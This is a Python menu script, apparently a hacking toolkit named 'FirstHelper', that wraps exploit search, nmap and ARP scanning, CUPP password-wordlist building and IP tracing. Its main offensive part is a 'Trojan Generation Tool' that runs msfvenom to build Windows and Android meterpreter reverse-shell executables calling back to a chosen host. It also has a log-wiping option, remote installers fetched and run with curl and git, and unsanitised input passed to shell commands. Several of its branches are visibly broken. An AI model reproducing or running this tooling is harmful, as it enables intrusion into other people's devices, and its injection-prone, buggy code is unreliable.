#!/usr/bin/env python
import os
import py_compile as pyc
import subprocess as sb
import time




def tool1():
    os.system("apt-get install figlet")
    os.system("clear")
    os.system("sudo git clone https://github.com/offensive-security/exploit-database.git")
    os.system("clear")
    os.system("sudo apt update && apt -y install exploitdb")
    os.system("figlet -f banner FirstHelper")
    print("""
       -> Welcome to the exploit scanning tool broo (;
       """)
    anahtarkelime = input("Enter a keyword : ")
    os.system("searchsploit " + anahtarkelime)

    istek = input("Do you want to make a new call? (y/n) : ")

    if istek == "y":
        tool1()

    elif istek == "n":
        print("See you later bro!")
        searchprocess = input("Do you want to go back to the main menu? (y/n) : ")
        if searchprocess == "y":
            main()
        elif searchprocess == "y":
            quit()
    else:
        print("""
          Wrong Choice!! (;
          """)
        x = input("Do you want to go back to the main menu? (y/n) : ")
        if x == "y":
            main()
        elif x == "y":
            quit()

def tool2():
    os.system("apt-get install figlet")
    os.system("clear")
    os.system("figlet -f banner FirstHelper")
    print("""
    -> Welcome to the in-network arp scanning tool with Netdiscover

       1-) Normal (Active) Scanning
       2-) Passive Scanning
       3-) Top Menu


        """)


    netchoice = input("Choice :")

    netip = input("Please enter the ip address to scan : ")

    if netchoice == "1":
        os.system("netdiscover "+"-r "+netip+" -i "+"eth0")

    elif netchoice == "2":
        os.system("netdiscover "+"-r "+netip+" -p "+" -i"+" eth0")

    else:
        print("Wrong Choice!")
        v = input("Do you want to go back to the main menu? (y/n) : ")
        if v == "y":
            main()
        elif v == "n":
            quit()

def tool3():
    os.system("apt-get install figlet")
    os.system("clear")
    os.system("sudo apt-get install nmap -y")
    os.system("clear")
    os.system("sudo pacman -S nmap -y")
    os.system("clear")
    os.system("figlet -f banner FirstHelper")
    print("""
       -NMAP-
     1-) Port Service + version scanning
     2-) Port service + version + details 
     3-) Port service + version + details + aggressive scanning
     4-) Os detection scanning
     5-) Standard scanning
     6-) Full port scan (65000+ ports + os + version + service)
     7-) Port service + version UDP scan (increased chance if there is a firewall)
     8-) Geolocation with reverse dns (script scan)
     9-) Dns brute force (subdomain finder script scan)
     Advanced use cases
     10-) Nmap version 
     11-) Main menü
    """)

    nmpchoice = input("Choice : ")
    targetip = input("Enter the IP address to be scanned : ")

    if nmpchoice == "1":
        os.system("nmap -sS -sV -T 2 -Pn "+targetip)
        prin(main())
    elif nmpchoice == "2":
        os.system("nmap -sS -T 2 -sV -Pn -v "+targetip)
    elif nmpchoice == "3":
        os.system("nmap -sS -sV -Pn -T 2 -v -A "+targetip)
    elif nmpchoice == "4":
        os.system("nmap -T 2 -Pn -O "+targetip)
    elif nmpchoice == "5":
        os.system("nmap -T 2 -Pn "+targetip)
    elif nmpchoice == "6":
        os.system("nmap -Pn -T 2 -sS -sV -v -O -p- "+targetip)
    elif nmpchoice == "7":
        os.system("nmap -Pn -T 2 -sS -sV -PU "+targetip)
    elif nmpchoice == "8":
        os.system("nmap -T 2 -Pn -sn --traceroute --script traceroute-geolocation "+targetip)
    elif nmpchoice == "9":
        os.system("nmap -T 2 -Pn -sn -script dns-brute "+targetip)
    elif nmpchoice == "10":
        os.system("nmap --version")
    elif nmpchoice == "11":
        main()
    else:
        print("Hatalı giriş!")
        npchoice = input("Do you want to go back to the main menu? (y/n) : ")
        if npchoice == "y":
            main()
        elif nmpsecim == "n":
            quit()
def tool4():
    os.system("apt-get install figlet")
    os.system("clear")
    os.system("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall")
    os.system("exit")
    os.system("clear")
    os.system("figlet -f banner FirstHelper")

    print('''
        
        - Welcome to Trojan Generation Tool -
        	''')

    ip = input("Local veya Dış Ip giriniz: ")
    port = input("Port Girin: ")
    print('''
        1-) windows/meterpreter/reverse_tcp
        2-) windows/meterpreter/reverse_http
        3-) windows/meterpreter/reverse_https
        	''')
    payload = input("Payload No Giriniz: ")
    kayityeri = input("Kayıt Yerini Giriniz: ")

    if (payload == "1"):
        os.system(
            "sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
    elif (payload == "2"):
        os.system(
            "sudo msfvenom -p windows/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
    elif (payload == "3"):
        os.system(
            "sudo msfvenom -p windows/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f exe -o " + kayityeri)
    elif (payload == "4"):
        os.system(
            "sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
    elif (payload == "5"):
        os.system(
            "sudo msfvenom -p android/meterpreter/reverse_http LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
    elif (payload == "6"):
        os.system(
            "sudo msfvenom -p android/meterpreter/reverse_https LHOST=" + ip + " LPORT=" + port + " -f apk -o " + kayityeri)
    else:
        print("Wrong choice!!")
        msfvchoice = input("Do you want to go back to the main menu? (y/n) : ")
        if msfvchoice == "y":
            main()
        elif msfvchoice == "n":
            quit()

def tool5():
    os.system("apt-get install figlet")
    os.system("clear")
    os.system("sudo apt install crunch")
    os.system("clear")
    os.system("sudo git clone https://github.com/Mebus/cupp.git")
    os.system("clear")
    os.system("sudo pacman -S perl git -y")
    os.system("clear")
    os.system("sudo git clone https://github.com/exiftool/exiftool.git")
    os.system("clear")
    os.system("figlet -f banner FirstHelper")
    print("""
    
    -Create Wordlist-
   
    1-) Cupp
    2-) Main menu
    3-) Exit
    
    """)
    wordsecim = input("Please choose the Wordlist tool : ")

    

    if wordsecim == "1":
        os.system("cd cupp && chmod +x cupp.py && sudo python3 cupp.py -i")

    elif wordsecim == "2":
        main()
    
    elif wordsecim == "3":
        quit()

    else:
        print("Wrong choice!!")
        f = input("Do you want to go back to the main menu? (y/n) : ")
        if f == "y":
            main()
        elif f == "n":
            quit()
def tool6():
    os.system("apt-get install figlet")
    os.system("clear")
    os.system("git clone https://github.com/rajkumardusad/IP-Tracer.git && cd IP-Tracer && chmod +x install &&  ./install")
    os.system("figlet -f banner FirstHelper")
    print("""
    -IP-TRACER-
    1-) Check your own Ip address
    2-) Query a specific Ip address
    3-) Main Menu
    
    """)
    querychoice = input("Please select the transaction : ")
    if querychoice == "1":
        os.system("trace -m")
    elif querychoice == "2":
        ipaddress = input("Please enter your Ip address : ")
        os.system("trace -t "+ipaddress)
        tracechoice = input("Top menu or main menu (t/m)")
        if tracechoice == "t" or "Y":
            tool6()
        else:
            main()

    elif querychoice == "3":
        main()

    else:
        print("Wrong choice!!")
        tracchoice= input("Do you want to go back to the main menu? (y/n) : ")
        if tracchoice == "y":
            main()
        elif tracchoice == "n":
            quit()



def tool7():
    print("""

    Geliştirici /Developer : @Professore_
    Telegram name : https://t.me/Professore_1

    Contributors to the project :  
    1. @sacriphanius
    2. @setpassunlock
    3. @LightsOfNorthern

    """)

    mainchoice = input("Main menu or exit (y/n) : ")
    if mainchoice == "y":
        main()
    else:
        quit()
    


def tool97():
    os.system("figlet -f banner FirstHelper")
    print("""
    This action is permanent please enter the confirmation text...!
    
    Onaylıyor musunuz?
    
    1-) Yes
    2-) No (Main menu)
    3-) Exit
    """)
    logconfirm = input("Please enter arguments : ")
    if logconfirm == "1":
        os.system("sudo rm -rf $HOME/Hack-Tools/nmap/*")
        os.system("sudo rm -rf $HOME/Hack-Tools/msf/*")
        os.system("sudo rm -rf $HOME/Hack-Tools/tmp/*")
        os.system("sudo rm -rf $HOME/Hack-Tools/cupp/*")
        os.system("sudo rm -rf $HOME/Hack-Tools/hash-identifier/*")
        print("Loglar silindi")
        deletelog = input("Main menu or Top menu (m/t) : ")
        if deletelog == "m" or "M":
            main()
        else:
            quit()

    elif logconfirm == "2":
        main()

    else:
        quit()

def tool98():
    os.system("sudo apt install neofetch")
    os.system("clear")
    os.system("neofetch")
    systemchoice = input("Main menu or exit (y/n) : ")
    if systemchoice == "y":
        main()
    else:
        quit()

def tool99():
    print("See you latter, Broo")
    time.sleep(0.8)
    quit()





def main():
    os.system("sudo apt-get install figlet")
    os.system("clear")
    os.system("figlet -f banner FirstHelper")

    print("""

-> 1-) Exploit scan tool                                                 
-> 2-) In-network arp scan with Netdiscover        ->97-) Delete Logs
-> 3-) Scanning with Nmap                          ->98-) System info           
-> 4-) Create trojan with Msfvenom                 ->99-) Exit
-> 5-) Creating a Wordlist
-> 6-) Track ip address with IP-Tracer
-> 7-) Producer and License Info
    """)

    profchoice = input("Choose : ")
    if profchoice == "1":
        tool1()
    if profchoice == "2":
        tool2()
    if profchoice == "3":
        tool3()
    if profchoice == "4":
        tool4()
    if profchoice == "5":
        tool5()
    if profchoice == "6":
        tool6()
    if profchoice == "7":
        tool7()
    if profchoice == "97":
        tool97()
    if profchoice == "98":
        tool98()
    if profchoice == "99":
        tool99()


if __name__ == '__main__':
    main()


